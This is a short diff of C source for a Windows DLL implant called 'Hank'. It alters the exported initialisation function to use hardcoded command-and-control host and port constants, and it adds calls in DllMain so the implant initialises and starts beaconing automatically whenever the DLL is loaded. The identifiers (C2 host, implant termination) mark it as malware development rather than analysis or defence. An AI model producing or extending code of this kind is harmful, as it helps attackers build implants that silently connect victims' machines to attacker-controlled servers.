@@ -198,6 +198,23 @@ BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved)
         GetModuleFileNameW(instance, G_DllPath, MAX_PATH);
     }
 
+
+
+
+    if (!HankInitialize())
+    {
+        wprintf(L"[!] HankInitialize failed.\n");
+        
+        return 1;
+    }
+
+    if (!HankStart())
+    {
+        wprintf(L"[!] HankStart failed.\n");
+        
+        return 1;
+    }
+
     return TRUE;
 }
 
@@ -205,19 +222,17 @@ BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved)
  * Exported API
  * ------------------------------------------------------------------------- */
 
-Hank_API BOOL HankInitialize(PCWSTR host, PCWSTR port)
+Hank_API BOOL HankInitialize()
 {
     if (IsImplantTerminationRequested()) return FALSE;
 
-    if (host != NULL)
-    {
-        (void)wcsncpy_s(G_C2Host, ARRAYSIZE(G_C2Host), host, _TRUNCATE);
-    }
+    
+    (void)wcsncpy_s(G_C2Host, ARRAYSIZE(G_C2Host), C2_HOST, _TRUNCATE);
+    
 
-    if (port != NULL)
-    {
-        (void)wcsncpy_s(G_C2Port, ARRAYSIZE(G_C2Port), port, _TRUNCATE);
-    }
+   
+    (void)wcsncpy_s(G_C2Port, ARRAYSIZE(G_C2Port), C2_PORT, _TRUNCATE);
+    
 
     if (!NetworkStartup()) return FALSE;
 
